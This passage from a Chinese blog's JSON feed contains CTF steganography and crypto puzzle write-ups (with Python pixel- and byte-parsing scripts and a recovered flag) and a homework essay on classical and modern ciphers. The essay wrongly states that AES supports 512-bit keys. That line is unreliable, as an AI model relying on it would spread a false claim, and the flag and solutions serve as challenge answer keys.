class=\"number\">200</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> w <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(img.size[<span class=\"number\">0</span>]):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(img.size[<span class=\"number\">1</span>]):</span><br><span class=\"line\">            r, g, b = rgb_list[h*<span class=\"number\">200</span> + w]</span><br><span class=\"line\">            img.putpixel((w, h), (<span class=\"built_in\">int</span>(r), <span class=\"built_in\">int</span>(g), <span class=\"built_in\">int</span>(b)))</span><br><span class=\"line\">    img.save(<span class=\"string\">f&quot;frame/<span class=\"subst\">&#123;<span class=\"built_in\">str</span>(i).zfill(<span class=\"number\">4</span>)&#125;</span>.png&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Saved frame/<span class=\"subst\">&#123;<span class=\"built_in\">str</span>(i).zfill(<span class=\"number\">4</span>)&#125;</span>.png&quot;</span>)</span><br><span class=\"line\">    i += <span class=\"number\">1</span></span><br></pre></td></tr></table></figure></p>\n<p>现在我们仔细观察一下获得的 29 张图片：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444466/Typera/2023/04/fb1417256ebdb703f6b023d21836f2bf.png\" alt=\"image-20230426014102173\" /></p>\n<p>放大细看，可以发现，大部分图片上都有几个随机出现白点：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444483/Typera/2023/04/02f03d1a519726d4487be9f6f0e3ea8d.png\" alt=\"image-20230426014119100\" /></p>\n<p>无论你是用 ps 还是 画图 或者是其他什么工具查看这些白点的像素，你都会发现它们的 RGB 为（233,233,233）</p>\n<p>接下来的思路是：把 29 张图中 RGB 为（233,233,233）的点提取出来，组成一张新图。<br />\n脚本如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">flag_img=Image.new(<span class=\"string\">&#x27;RGB&#x27;</span>,(<span class=\"number\">200</span>,<span class=\"number\">200</span>))</span><br><span class=\"line\"><span class=\"keyword\">for</span> name <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">29</span>):</span><br><span class=\"line\">    img = Image.<span class=\"built_in\">open</span>(<span class=\"string\">f&quot;frame/<span class=\"subst\">&#123;<span class=\"built_in\">str</span>(name).zfill(<span class=\"number\">4</span>)&#125;</span>.png&quot;</span>)</span><br><span class=\"line\">    img = img.convert(<span class=\"string\">&quot;RGB&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> w <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(img.size[<span class=\"number\">0</span>]):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(img.size[<span class=\"number\">1</span>]):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> img.getpixel((w,h)) == (<span class=\"number\">233</span>,<span class=\"number\">233</span>,<span class=\"number\">233</span>):</span><br><span class=\"line\">                flag_img.putpixel((w,h),(<span class=\"number\">233</span>,<span class=\"number\">233</span>,<span class=\"number\">233</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">flag_img.save(<span class=\"string\">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure><br />\n 获得的图片如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444530/Typera/2023/04/0abbeb74a9829e5975738dce464003bf.png\" alt=\"cumtctf2022wp14\" /></p>\n",
            "tags": [
                "Python",
                "Crypto",
                "CTF",
                "Misc",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/Homework/%E6%95%B0%E5%AD%A6%E6%80%9D%E7%BB%B4%E5%9C%A8%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/",
            "url": "https://www.sycamore.top/Homework/%E6%95%B0%E5%AD%A6%E6%80%9D%E7%BB%B4%E5%9C%A8%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/",
            "title": "数学思维在密码学中的应用",
            "date_published": "2022-03-03T15:15:28.000Z",
            "content_html": "<div class=\"note info\">\n<p>作业 (o′┏▽┓｀o)</p>\n</div>\n<h1 id=\"数学思维在密码学中的应用\"><a class=\"anchor\" href=\"#数学思维在密码学中的应用\">#</a> 数学思维在密码学中的应用</h1>\n<p>在进行具体阐述之前，我认为有必要初步介绍一下密码学</p>\n<h2 id=\"密码学介绍\"><a class=\"anchor\" href=\"#密码学介绍\">#</a> 密码学介绍</h2>\n<p>我认为密码学要探讨的问题，就是如何<strong>更好地进行信息加密</strong>、防止信息泄露。<br />\n密码学有数千年的历史。最开始为了防止信息泄露，会采取诸如，将信息用特殊的化学墨水写在纸上加以隐藏的手段，<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682440953/Typera/2023/04/d03e7e1cc30ada4331e61a76e994adc3.png\" alt=\"image-20230426000837810\" /><br />\n 但是这样的保密措施非常容易破解，但凡知道这个方法，就能轻易地读取隐藏地信息。<br />\n所以就诞生了<strong>密码</strong> —— 一种通过<strong>密钥</strong>加密信息的手段</p>\n<h2 id=\"古典密码\"><a class=\"anchor\" href=\"#古典密码\">#</a> 古典密码</h2>\n<p>1976 年以前的密码都属于古典密码，<br />\n古典密码有很多种，基本地可以大致分为两种，<strong>换位密码</strong>和<strong>替换密码</strong>。<br />\n简单来说，换位密码就是把<strong>明文</strong>（需加密的信息）打乱顺序重新排列，而替换密码就是用一张<strong>密码表</strong>替换明文中的特定字符</p>\n<h3 id=\"凯撒密码\"><a class=\"anchor\" href=\"#凯撒密码\">#</a> 凯撒密码</h3>\n<p>以替换密码为例，最简单的替换密码就是<strong>移位密码</strong>。移位密码，顾名思义就是把 <em>某种字符表</em> 按顺序后移 n 位。这个 n 就是所谓的<strong>密钥</strong>，而后移之后生成的 <em>新的字符表</em> 就是之前所说的<strong>密码表</strong>。其中，若是使用以 26 个英文字母（以及 10 个阿拉伯数字）构成的字符表，那么这种密码也被称为<strong>凯撒加密</strong>。<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682440961/Typera/2023/04/48cfe8124c9d3306a048a7112bec67fd.png\" alt=\"image-20230426000350453\" /><br />\n 如上图所示，当 <strong>n = 3</strong> 的时候，即<strong>密钥 key = 3</strong>，<br />\n原字符表为：ABCDE...WXYZ<br />\n 而<strong>密码表</strong>为：DEFGH...ZABC</p>\n<p>凯撒密码的原理非常简单，对应<strong>破解</strong>的方式也就非常容易，我们只需要列举出 在所有可能的密码表（共 26 种）下<strong>解密</strong> 得到的答案就行了，<br />\n毕竟我们能够很清楚地知道，26 种答案里肯定有我们需要的那一个，再要做的，只是读读哪个更加通顺罢了。</p>\n<h3 id=\"维吉尼亚密码\"><a class=\"anchor\" href=\"#维吉尼亚密码\">#</a> 维吉尼亚密码</h3>\n<p>因为凯撒密码的破解实在是过于简单，所以在凯撒密码的基础上，诞生了一种新的密码，即<strong>维吉尼亚密码</strong>，它蕴含的一个思想就是<strong>多表替换</strong>。<br />\n所谓多表替换，就是准备<strong>多张密码表</strong>，明文的前 n 位选用第 i 张密码表，再后 m 位选用第 j 张... 以此类推，用完所有的密码表之后，就从第 i 张再来过</p>\n<p>而<strong>维吉尼亚加密</strong>，就是准备了 26 张密码表，分别对应<strong>凯撒加密</strong>的 26 种可能的密码表，依次标记为 ABC...XYZ 。上文的 n 和 m ，在<strong>维吉尼亚加密</strong>中都是 1，而所有的 i 和 j 对应密码表的标记，组合起来就是<strong>密钥</strong>。<br />\n下表即为维吉尼亚加密的密码表（总）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682440964/Typera/2023/04/92b5e30160b6461906f1c86ecd48e578.png\" alt=\"image-20230426000421243\" /></p>\n<p>举个例子，假设明文为 <strong>GREAT</strong> ，密钥为 <strong>GOOD</strong><br />\n 首先填充密钥 使其长度与明文一致，即 <strong>GOODG</strong><br />\n 那么，由 G 对应的密码表（列），找到它的第 G 行，得到第一个密文为 M<br />\n 然后，由 O 对应的密码表，找到第 R 行，得到第二个密文为 F<br />\n 同理，我们能获得剩下三个密文为 SDZ，<br />\n即，明文 GREAT ，密钥 GOOD 下的维吉尼亚加密结果为 <strong>MFSDZ</strong></p>\n<p>这样一来，在凯撒密码基础上 通过<strong>多表替换思想</strong>进阶的维吉尼亚密码，对于计算机尚未问世的时代来说，要在<strong>未知密钥</strong>的情况下强行<strong>破解</strong>维吉尼亚密码，绝对是一个大工程。</p>\n<h2 id=\"对称密码体制和非对称密码体制\"><a class=\"anchor\" href=\"#对称密码体制和非对称密码体制\">#</a> 对称密码体制和非对称密码体制</h2>\n<h3 id=\"一对称加密\"><a class=\"anchor\" href=\"#一对称加密\">#</a> 一。对称加密</h3>\n<p>对称加密是最快速、最简单的一种加密方式，加密（encryption）与解密（decryption）用的是同样的密钥（secret key）。对称加密有很多种算法，由于它效率很高，所以被广泛使用在很多加密协议的核心当中。自 1977 年美国颁布 DES（Data Encryption Standard）密码算法作为美国数据加密标准以来，对称密码体制迅速发展，得到了世界各国的关注和普遍应用。对称密码体制从工作方式上可以分为分组加密和序列密码两大类。</p>\n<p>对称加密算法的优点：算法公开、计算量小、加密速度快、加密效率高。</p>\n<p>对称加密算法的缺点：交易双方都使用同样钥匙，安全性得不到保证。此外，每对用户每次使用对称加密算法时，都需要使用其他人不知道的惟一钥匙，这会使得发收信双方所拥有的钥匙数量呈几何级数增长，密钥管理成为用户的负担。对称加密算法在分布式网络系统上使用较为困难，主要是因为密钥管理困难，使用成本较高。而与公开密钥加密算法比起来，对称加密算法能够提供加密和认证却缺乏了签名功能，使得使用范围有所缩小。</p>\n<p>对称加密通常使用的是相对较小的密钥，一般小于 256 bit。因为密钥越大，加密越强，但加密与解密的过程越慢。如果你只用 1 bit 来做这个密钥，那黑客们可以先试着用 0 来解密，不行的话就再用 1 解；但如果你的密钥有 1 MB 大，黑客们可能永远也无法破解，但加密和解密的过程要花费很长的时间。密钥的大小既要照顾到安全性，也要照顾到效率，是一个 trade-off。</p>\n<p>分组密码：也叫块加密 (block cyphers)，一次加密明文中的一个块。是将明文按一定的位长分组，明文组经过加密运算得到密文组，密文组经过解密运算（加密运算的逆运算），还原成明文组，有 ECB、CBC、CFB、OFB 四种工作模式。</p>\n<p>序列密码：也叫流加密 (stream cyphers)，一次加密明文中的一个位。是指利用少量的密钥（制乱元素）通过某种复杂的运算（密码算法）产生大量的伪随机位流，用于对明文位流的加密。解密是指用同样的密钥和密码算法及与加密相同的伪随机位流，用以还原明文位流。</p>\n<p>常用对称加密算法包括 DES、3DES、AES</p>\n<ol>\n<li>DES（Data Encryption Standard）：数据加密标准，速度较快，适用于加密大量数据的场合。</li>\n<li>3DES（Triple DES）：是基于 DES，对一块数据用三个不同的密钥进行三次加密，强度更高。</li>\n<li>AES（Advanced Encryption Standard）：高级加密标准，是下一代的加密算法标准，速度快，安全级别高，支持 128、192、256、512 位密钥的加密。</li>\n</ol>\n<p>算法特征</p>\n<ol start=\"4\">\n<li>加密方和解密方使用同一个密钥。</li>\n<li>加密解密的速度比较快，适合数据比较长时的使用。</li>\n<li>密钥传输的过程不安全，且容易被破解，密钥管理也比较麻烦。</li>\n</ol>\n<h3 id=\"二非对称加密\"><a class=\"anchor\" href=\"#二非对称加密\">#</a> 二。非对称加密</h3>\n<p>非对称加密为数据的加密与解密提供了一个非常安全的方法，它使用了一对密钥，公钥（public key）和私钥（private key）。私钥只能由一方安全保管，不能外泄，而公钥则可以发给任何请求它的人。非对称加密使用这对密钥中的一个进行加密，而解密则需要另一个密钥。比如，你向银行请求公钥，银行将公钥发给你，你使用公钥对消息加密，那么只有私钥的持有人 -- 银行才能对你的消息解密。与对称加密不同的是，银行不需要将私钥通过网络发送出去，因此安全性大大提高。</p>\n<p>非对称加密算法的优点：安全性更高，公钥是公开的，秘钥是自己保存的，不需要将私钥给别人。</p>\n<p>非对称加密算法的缺点：加密和解密花费时间长、速度慢，只适合对少量数据进行加密。</p>\n<p>对称加密算法相比非对称加密算法来说，加解密的效率要高得多。但是缺陷在于对于秘钥的管理上，以及在非安全信道中通讯时，密钥交换的安全性不能保障。所以在实际的网络环境中，会将两者混合使用。</p>\n<p>非对称加密算法包括 RSA、Elgamal、背包算法、Rabin、D-H、ECC（椭圆曲线加密算法），常见的有 RSA、ECC。</p>\n<h3 id=\"三分组加密的四种工作模式\"><a class=\"anchor\" href=\"#三分组加密的四种工作模式\">#</a> 三。分组加密的四种工作模式</h3>\n<h4 id=\"1ecb\"><a class=\"anchor\" href=\"#1ecb\">#</a> 1.ECB</h4>\n<p>ECB 模式是最简单的加密模式，明文消息被分成固定大小的块（分组），并且每个块被单独加密。每个块的加密和解密都是独立的，且使用相同的方法进行加密，所以可以进行并行计算，但是这种方法一旦有一个块被破解，使用相同的方法可以解密所有的明文数据，安全性比较差。适用于数据较少的情形，加密前需要把明文数据填充到块大小的整倍数。</p>\n<p>ECB 算法优点：<br />\n简单、孤立，每个块单独运算。适合并行运算。传输错误一般只影响当前块。<br />\nECB 算法缺点：<br />\n同明文输出同密文，可能导致明文攻击。</p>\n<h4 id=\"2cbc\"><a class=\"anchor\" href=\"#2cbc\">#</a> 2.CBC</h4>\n<p>CBC 模式中每一个分组要先和前一个分组加密后的数据进行 XOR 异或操作，然后再进行加密。这样每个密文块依赖该块之前的所有明文块，为了保持每条消息都具有唯一性，第一个数据块进行加密之前需要用初始化向量 IV 进行异或操作。CBC 模式是一种最常用的加密模式，它主要缺点是加密是连续的，不能并行处理，并且与 ECB 一样消息块必须填充到块大小的整倍数。</p>\n<p>CBC 算法优点：<br />\n串行化运算，相同明文不同密文。<br />\nCBC 算法缺点：<br />\n需要初始向量。</p>\n<h4 id=\"3cfb\"><a class=\"anchor\" href=\"#3cfb\">#</a> 3.CFB</h4>\n<p>CFB 模式和 CBC 模式比较相似，前一个分组的密文加密后和当前分组的明文 XOR 异或操作生成当前分组的密文。CFB 模式的解密和 CBC 模式的加密在流程上其实是非常相似的。</p>\n<p>CFB 算法优点：<br />\n同明文不同密文，分组密钥转换为流密码。<br />\nCFB 算法缺点：<br />\n串行运算不利并行，传输错误可能导致后续传输块错误。</p>\n<h4 id=\"4ofb\"><a class=\"anchor\" href=\"#4ofb\">#</a> 4.OFB</h4>\n<p>OFB 模式将分组密码转换为同步流密码，也就是说可以根据明文长度先独立生成相应长度的流密码。通过流程图可以看出，OFB 和 CFB 非常相似，CFB 是前一个分组的密文加密后 XOR 当前分组明文，OFB 是前一个分组与前一个明文块异或之前的流密码 XOR 当前分组明文。由于异或操作的对称性，OFB 模式的解密和加密完全一样的流程。</p>\n<p>OFB 算法优点：<br />\n同明文不同密文，分组密钥转换为流密码。<br />\nOFB 算法缺点：<br />\n串行运算不利并行，传输错误可能导致后续传输块错误。</p>\n",
            "tags": [
                "Python",
                "Crypto"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/TQLCTF-MISC-Ranma%C2%BD/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/TQLCTF-MISC-Ranma%C2%BD/",
            "title": "TQLCTF-MISC-Ranma½",
            "date_published": "2022-02-22T14:36:41.000Z",
            "content_html": "<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"ranma12\"><a class=\"anchor\" href=\"#ranma12\">#</a> Ranma½</h3>\n<p>终归还是少了点经验，以及一些奇奇怪怪的知识。。。</p>\n<h4 id=\"utf-8可变长编码\"><a class=\"anchor\" href=\"#utf-8可变长编码\">#</a> UTF-8 可变长编码</h4>\n<p>首先一定要详细了解 UTF-8 编码，<br />\n完整的表如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682438191/Typera/2023/04/fdfd2d8940cbcb3dad4d6ee71124333c.png\" alt=\"image-20230425235627337\" /></p>\n<blockquote>\n<p>图中一行的  <code>xxx...</code>  部分组合起来即为对应的 Unicode 代码</p>\n</blockquote>\n<p>可能这样还是比较难以理解，那就仔细阅读下面的例子就行了：</p>\n<p>希伯来语字母 א 的 Unicode 代码是 U+<strong>05D0</strong>，UTF-8 是 <strong>0xD7 0x90</strong>，<br />\n则 Unicode to UTF-8 转换如下：</p>\n<ul>\n<li>首先判断它属于哪一行：<br />\nU+0080 到 U+07FF，观察表中对应行，说明它使用双字节，即 110<strong>xxxxx</strong> 10<strong>xxxxxx</strong></li>\n<li>然后分解十六进制的<strong> 0x05D0</strong>，换算成二进制就是（0）101-1101-0000</li>\n<li>最后，把这 11 位数按顺序填入前后的 &quot;x&quot; 部分：110<strong>10111</strong> 10<strong>010000</strong></li>\n</ul>\n<p>110<strong>10111</strong> 10<strong>010000</strong> 换成 16 进制就是 <strong>D7 90</strong>，即对应的 UTF-8 编码</p>\n<p>看懂了上述例子，UTF-8 to Unicode 就是简单反过来就行了</p>\n<h4 id=\"信息隐藏的思路\"><a class=\"anchor\" href=\"#信息隐藏的思路\">#</a> 信息隐藏的思路</h4>\n<p>到这里，我们就了解了 UTF-8 编码 “可变长” 的特点，<br />\n既然它是可变长的，那么我们就可以利用<strong>这个特性</strong>去隐藏信息：<br />\n直接用一般的文本编辑器打开题目给的文件，会有很多乱码，因为它们大多是逐字节转换的，而 UTF-8 的单个字符 可能有 1~4 个字节的长度，</p>\n<p>因此，如果我们要隐藏 <strong>A</strong> 字符，Unicode 就是 <strong>0x41</strong>，换算成二进制就是 <strong>100 0001</strong>，<br />\n再假设我们要把它藏到 UTF-8 编码的<strong>第二行 U+0080 到 U+07FF</strong> 里面，那么我们一共需要 11 个数字，<br />\n于是人为地在高位填充 4 个 0，得到：<strong>000-0100-0001</strong>，再将这 11 个数字填入表中对应的 x 部分，就得到：110<strong>00001</strong> 10<strong>000001</strong>，即 UTF-8 编码的 <strong>C1 81</strong>，从而骗过大部分的文本编辑器</p>\n<h4 id=\"解题过程\"><a class=\"anchor\" href=\"#解题过程\">#</a> 解题过程</h4>\n<p>实际上有挺多方法，用 vim 打开，或者用 WinRAR 的 “查看” 打开（这个属实有点奇怪）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682438200/Typera/2023/04/1771f16334a694ed24fac59a74971010.png\" alt=\"image-20230425235636085\" /><br />\n 或者可以写脚本分析：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\">x,y,z=[],[],[]</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;Ranma&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">\t<span class=\"keyword\">try</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\tStr = f.read(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"keyword\">not</span> Str:<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\tx.append(binascii.hexlify(Str))</span><br><span class=\"line\">\t<span class=\"keyword\">finally</span>:</span><br><span class=\"line\">\t\tf.close() <span class=\"comment\"># 读文件，将16进制字串存入list x</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(x)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">int</span>(x[i],<span class=\"number\">16</span>)&lt;<span class=\"number\">128</span>:</span><br><span class=\"line\">\t\ty.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(x[i],<span class=\"number\">16</span>))) <span class=\"comment\"># 小于128的直接chr()转换ASCII码</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">int</span>(x[i],<span class=\"number\">16</span>)&gt;<span class=\"number\">127</span>:</span><br><span class=\"line\">\t\ty.append(<span class=\"built_in\">bin</span>(<span class=\"built_in\">int</span>(x[i],<span class=\"number\">16</span>))) <span class=\"comment\"># 大于128的转换为二进制分析</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(y)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;0b110&#x27;</span> <span class=\"keyword\">in</span> y[i]: <span class=\"comment\"># 如果是第二行的情况</span></span><br><span class=\"line\">\t\ty[i]=<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(y[i][<span class=\"number\">5</span>:]+(y[i+<span class=\"number\">1</span>])[<span class=\"number\">4</span>:],<span class=\"number\">2</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;0b1110&#x27;</span> <span class=\"keyword\">in</span> y[i]: <span class=\"comment\"># 如果是第三行的情况</span></span><br><span class=\"line\">\t\ty[i]=<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(y[i][<span class=\"number\">6</span>:]+(y[i+<span class=\"number\">1</span>])[<span class=\"number\">4</span>:]+(y[i+<span class=\"number\">2</span>])[<span class=\"number\">4</span>:],<span class=\"number\">2</span>))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(y)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;0b&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> y[i]: <span class=\"comment\"># 去除多余项并合并</span></span><br><span class=\"line\">\t\tz.append(y[i])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>.join(z))</span><br></pre></td></tr></table></figure><br />\n 得到：</p>\n<blockquote QFOLP6_KRZ1Q=\"\">\n<p>KGR/QRI 10646-1 zswtqgg d tnxcs tsdtofbrx osk ndnzhl gna Ietygfviy Idoilfvsu Arz (QQJ) hkkqk maikaglvusv ubyp cw ekg krzyj'o kitwkbj alypsdd.  Wjs rzvmebrwoa duwcuosu pqecgqamo cw ekg IFA, uussmpu, ysum aup qfxschljyk swks pcbb khxnsee drdoqpgpwfyv cbg xeupctzou, oql gneg ylv nsg bb zds upygzrxzkjh fq XVT-8, wpr uxxvnw qt wpvy isdz. XVT-8 kif zds tsdtofbrxegktf qt szryafmtqi hkm sahz LD-DUQLQ egjuv, auqjllvtc qfxschljvrehp hlvv iqyk omjehog, sieyafj lqf cwprx ocwezcfh bugp fvwb qb XA-NYYWZ gdniha oap oip wtoqacgnsee wq cwprx rocfhu. HTTPZB</p>\n</blockquote>\n<p>观察猜测是维吉尼亚加密，</p>\n<ol>\n<li>\n<p>直接爆破 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGNvZGUuZnIvdmlnZW5lcmUtY2lwaGVy\">在线网址</span> ：<br />\n点击 AUTOMATIC DECRYPTION，爆破即可</p>\n</li>\n<li>\n<p>看官方 wp，（这个密钥要拿到脑洞也太大了吧。。。）<br />\n依次列举出 UTF-8 编码文字的长度，长度为 1 的字符转换为<strong>点</strong>，长度为 2 的字符转换为<strong>线</strong>，长度为 3 的字符转换成<strong>分隔符</strong>，经过 <strong>Morse</strong> 解读获得密钥<br />\n (￣▽￣)&quot;<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682438209/Typera/2023/04/150cd961046421d365382e0994f34fba.png\" alt=\"image-20230425235644738\" /><br />\nflag： <code>TQLCTF&#123;CODIN6_WOR1D&#125;</code></p>\n</li>\n</ol>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/2022hgame-week1/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/2022hgame-week1/",
            "title": "2022hgame week1",
            "date_published": "2022-02-05T04:46:27.000Z",
            "content_html": "<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"dancing_line\"><a class=\"anchor\" href=\"#dancing_line\">#</a> Dancing_Line</h3>\n<p>有点靠脑洞啊，这道 crypto 不讲武德 /_ \\ ，不过仔细看看还是大概能猜到的～</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437580/Typera/2023/04/d902f3ec8dfa08547fca2ab2f0d0f237.bmp\" alt=\"\" /><br />\n图片上有一条线，放大可以看出，每隔一小段会有一个黑点<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437729/Typera/2023/04/f02b3b2084d99f2b7639a572df5b0d8a.png\" alt=\"image-20230425234706530\" /><br />\n 所以，我用 python PIL 库写个脚本导出黑点的坐标</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">img=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./Dancing_Line.bmp&#x27;</span>)</span><br><span class=\"line\">w,h=img.size</span><br><span class=\"line\"><span class=\"comment\">#print(w,h)</span></span><br><span class=\"line\">pos=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(w):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(h):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> img.getpixel((i,j))!=(<span class=\"number\">255</span>,<span class=\"number\">255</span>,<span class=\"number\">255</span>):</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> img.getpixel((i,j))==(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>):</span><br><span class=\"line\">\t\t\t\tpos.append((i,j))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pos)</span><br></pre></td></tr></table></figure><br />\n 得到如下字串：</p>\n<blockquote>\n<p>[(0, 0), (5, 3), (8, 8), (13, 11), (16, 16), (20, 20), (22, 26), (28, 28), (33, 31), (36, 36), (40, 40), (45, 43), (48, 48), (51, 53), (53, 59), (58, 62), (63, 65), (66, 70), (70, 74), (72, 80), (77, 83), (81, 87), (83, 93), (87, 97), (90, 102), (93, 107), (98, 110), (100, 116), (105, 119), (109, 123), (112, 128), (116, 132), (120, 136), (122, 142), (127, 145), (131, 149), (133, 155), (135, 161)]</p>\n</blockquote>\n<p>仔细找找规律可以发现，相邻黑点坐标之差均为 8<br />\n 同理导出线上所有点的坐标，不难看出，相邻点的坐标，要么是横坐标加 1，要么是纵坐标加 1，</p>\n<p>再结合相邻黑点坐标差为 8 这个数字，所以推测这应该是一个二进制编码 （。＾▽＾）<br />\n几番尝试之后确定为，纵坐标增长为 1，横坐标增长为 0</p>\n<p>最后将二进制转换为 ASCII 码，即可得到 flag</p>\n<p>完整 exp 如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span 